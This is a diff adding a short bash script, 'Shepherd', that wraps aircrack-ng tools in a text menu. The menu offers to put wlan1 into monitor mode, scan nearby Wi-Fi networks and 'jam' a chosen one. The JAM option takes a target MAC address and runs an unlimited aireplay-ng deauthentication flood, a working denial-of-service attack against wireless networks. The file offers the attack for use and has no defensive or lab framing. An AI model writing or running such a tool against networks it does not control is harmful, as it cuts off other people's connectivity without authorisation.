@@ -1,0 +1,64 @@
+#!/usr/bin/bash
+
+appname=shepherd
+
+stat=BETA
+
+
+clear && figlet -f standard "Shepherd +"
+
+echo "--------------------------------------( $stat )-------"
+echo ""
+
+
+
+   echo "[SC]: Scan Area of operation."
+   echo "[MON]: Set Wlan1 to MONITOR MODE."
+   echo "[RL]: Reload program."
+   echo "[JAM]: Jam a selected WiFi Network."
+
+
+
+echo ""
+echo "------------------ Type EXT to Exit -------------------"
+echo "-------------------------------------------------------"
+echo "------------------ Valid Interfaces -------------------"
+echo ""
+ifconfig | grep 'wlan'
+echo ""
+echo "-------------------------------------------------------"
+
+
+read ans
+if [[ $ans = "RL" ]];
+then bash $appname
+
+
+elif [[ $ans = "JAM" ]];
+then echo "Please type the MAC ADDR for the target." && read rname && sudo aireplay-ng -0 0 -a $rname wlan1mon && bash $appname
+
+
+
+
+elif [[ $ans = "MON" ]];
+then clear && sudo airmon-ng start wlan1 && bash $appname
+
+
+
+
+
+elif [[ $ans = "EXT" ]];
+ then bash
+
+
+
+
+
+
+
+  elif [[ $ans = "SC" ]];
+   then
+   echo "Scanning." && sleep 2s && sudo airodump-ng wlan1mon && bash $appname
+   else echo "Please select a valid option." && sleep 2s && bash $appname
+ fi
+
